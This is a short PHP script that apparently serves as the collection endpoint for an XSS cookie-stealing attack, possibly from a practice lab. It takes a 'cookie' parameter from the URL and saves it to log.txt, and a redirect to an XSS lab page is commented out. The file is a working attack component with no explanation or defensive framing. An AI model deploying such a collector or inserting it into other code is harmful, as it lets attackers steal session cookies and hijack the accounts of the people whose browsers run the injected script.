<?php

$cookie = $_GET['cookie'];

file_put_contents('log.txt', $cookie);

// header('Location:/xsscrosssitescripting/index.php');